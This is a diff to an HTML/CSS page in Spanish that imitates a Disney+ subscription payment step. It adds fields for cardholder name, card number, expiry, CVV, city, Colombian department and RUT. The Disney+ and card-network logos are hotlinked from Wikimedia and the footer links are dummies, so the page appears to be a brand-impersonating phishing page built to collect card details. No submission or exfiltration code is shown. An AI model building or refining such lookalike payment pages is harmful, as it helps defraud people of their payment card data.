@@ -3,73 +3,98 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Método de pago | Disney+</title>
+<title>Paso 3 | Disney+</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 
 <style>
 body {
     margin: 0;
-    background: #f1f2f3;
+    background: #0f0f0f;
     font-family: 'Inter', sans-serif;
+    color: #fff;
+}
+
+/* HEADER */
+header {
+    padding: 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+header img {
+    height: 34px;
+}
+
+header a {
+    color: #bbb;
+    font-size: 15px;
+    text-decoration: none;
 }
 
 /* CONTENEDOR PRINCIPAL */
-.container {
-    max-width: 430px;
-    margin: 40px auto 0 auto;
-    background: #fff;
-    padding: 30px;
-    border-radius: 18px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+.main-container {
+    padding: 20px;
+    max-width: 600px;
+    margin: auto;
 }
 
-/* TITULO */
+.step {
+    font-size: 14px;
+    color: #9ca3af;
+}
+
 h1 {
-    font-size: 24px;
-    font-weight: 600;
-    color: #000;
+    font-size: 28px;
+    margin-top: 5px;
+    margin-bottom: 25px;
 }
 
-.sub {
-    margin-top: 6px;
-    font-size: 15px;
-    color: #555;
-    line-height: 1.4;
+/* TABS DE MÉTODO DE PAGO */
+.tabs {
+    display: flex;
+    margin-bottom: 20px;
+    border-bottom: 1px solid #333;
 }
 
-/* LABEL */
+.tab {
+    flex: 1;
+    text-align: center;
+    padding: 12px 0;
+    font-size: 16px;
+    cursor: pointer;
+    color: #bbb;
+}
+
+.tab.active {
+    color: #00c8ff;
+    border-bottom: 2px solid #00c8ff;
+}
+
+/* LABELS */
 label {
-    font-size: 13px;
-    color: #333;
     display: block;
-    margin-bottom: 6px;
+    margin: 18px 0 6px;
+    font-size: 14px;
+    color: #d1d5db;
 }
 
-/* INPUT BASE */
-input {
+/* INPUTS */
+input, select {
     width: 100%;
-    padding: 14px;
-    border: 1.5px solid #c3c5c8;
-    border-radius: 8px;
+    padding: 15px;
+    background: #1a1a1a;
+    border: 1px solid #383838;
+    border-radius: 6px;
+    color: #fff;
     font-size: 15px;
-    background: #f8f8f9;
-    color: #000;
-    outline: none;
+    box-sizing: border-box;
 }
 
-input:focus {
-    border-color: #00c8ff;
-    background: #fff;
-}
-
-/* INPUT TARJETA CON ICONOS */
+/* INPUT ESPECIAL PARA TARJETA */
 .input-card {
     position: relative;
-}
-
-.input-card input {
-    padding-right: 120px;
 }
 
 .card-icons {
@@ -82,76 +107,92 @@ input:focus {
 }
 
 .card-icons img {
-    height: 24px;
+    height: 26px;
     opacity: .9;
 }
 
-/* FECHA + CVV LADO A LADO */
+/* FILA FECHA / CVV */
 .row-double {
     display: flex;
-    gap: 14px;
-    margin-top: 12px;
+    gap: 15px;
+    margin-top: 5px;
 }
 
-.field-group { flex: 1; }
+.field-group {
+    flex: 1;
+    min-width: 0;
+}
 
-/* BOTÓN */
+/* BOTÓN FINAL */
 button {
     width: 100%;
-    padding: 15px;
-    background: #000;
-    color: #fff;
-    border: none;
-    border-radius: 40px;
-    font-size: 16px;
+    padding: 16px;
     margin-top: 25px;
+    background: #fff;
+    border: none;
+    color: #000;
+    border-radius: 30px;
+    font-size: 17px;
     cursor: pointer;
     font-weight: 600;
 }
 
-button:hover {
-    opacity: .85;
-}
-
 /* FOOTER */
 footer {
-    margin-top: 45px;
+    margin-top: 50px;
+    padding: 35px 20px;
+    background: #0d0d0d;
+    color: #7e7e7e;
     text-align: center;
-    padding-bottom: 40px;
+    font-size: 13px;
 }
 
-footer img {
-    height: 32px;
-    opacity: .6;
-    margin: 6px;
+footer .footer-top {
+    margin-bottom: 15px;
 }
 
-/* RESPONSIVE */
-@media(max-width: 450px) {
-    .container {
-        margin: 20px;
-        padding: 25px;
-    }
+footer a {
+    color: #00c8ff;
+    text-decoration: none;
+    font-size: 13px;
+}
 
+/* RESPONSIVE: si la pantalla es muy angosta, se ponen uno debajo del otro */
+@media (max-width: 480px) {
     .row-double {
-        gap: 10px;
+        flex-direction: column;
+        gap: 0;
     }
 }
 </style>
-
 </head>
+
 <body>
 
-<!-- CONTENEDOR -->
-<div class="container">
+<!-- HEADER -->
+<header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
+    <a href="#">Cerrar sesión</a>
+</header>
 
-    <h1>Método de pago</h1>
-    <p class="sub">Agrega una tarjeta válida para continuar con la suscripción.</p>
+<!-- CONTENIDO PRINCIPAL -->
+<div class="main-container">
 
-    <!-- TARJETA -->
-    <label>NÚMERO DE TARJETA</label>
+    <div class="step">PASO 3 DE 3</div>
+    <h1>¡A disfrutar!</h1>
+
+    <!-- TAB SOLO TARJETA -->
+    <div class="tabs">
+        <div class="tab active">Crédito/Débito</div>
+    </div>
+
+    <!-- FORMULARIO -->
+    <label>NOMBRE EN LA TARJETA</label>
+    <input type="text" placeholder="Nombre del titular">
+
+    <label>NÚMERO DE LA TARJETA</label>
     <div class="input-card">
-        <input type="text" placeholder="•••• •••• •••• ••••">
+        <input type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
         <div class="card-icons">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
             <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
@@ -159,7 +200,6 @@ footer img {
         </div>
     </div>
 
-    <!-- FECHA + CVV -->
     <div class="row-double">
         <div class="field-group">
             <label>FECHA DE VENCIMIENTO</label>
@@ -172,26 +212,33 @@ footer img {
         </div>
     </div>
 
-    <!-- NOMBRE -->
-    <div style="margin-top:15px;">
-        <label>NOMBRE EN LA TARJETA</label>
-        <input type="text" placeholder="Como aparece en la tarjeta">
-    </div>
+    <label>CIUDAD</label>
+    <input type="text" placeholder="Ingrese su ciudad">
 
-    <!-- BOTÓN -->
-    <button>Continuar</button>
+    <label>DEPARTAMENTO</label>
+    <select>
+        <option>Seleccionar…</option>
+        <option>Antioquia</option>
+        <option>Cundinamarca</option>
+        <option>Valle del Cauca</option>
+        <option>Atlántico</option>
+        <option>Santander</option>
+    </select>
 
+    <label>RUT (OPCIONAL)</label>
+    <input type="text" placeholder="Opcional">
+
+    <button>INICIAR SUSCRIPCIÓN</button>
 </div>
 
 <!-- FOOTER -->
 <footer>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney_wordmark.svg">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/80/ABC_Network_logo.svg">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/ESPN_wordmark.svg">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/MarvelLogo.svg">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Star_Wars_Logo.svg">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/8f/National-Geographic-Logo.svg">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5a/Hulu_Logo.svg">
+    <div class="footer-top">
+        © 2025 Disney+. Todos los derechos reservados.
+    </div>
+    <a href="#">Términos de uso</a> · 
+    <a href="#">Política de privacidad</a> · 
+    <a href="#">Ayuda</a>
 </footer>
 
 </body>
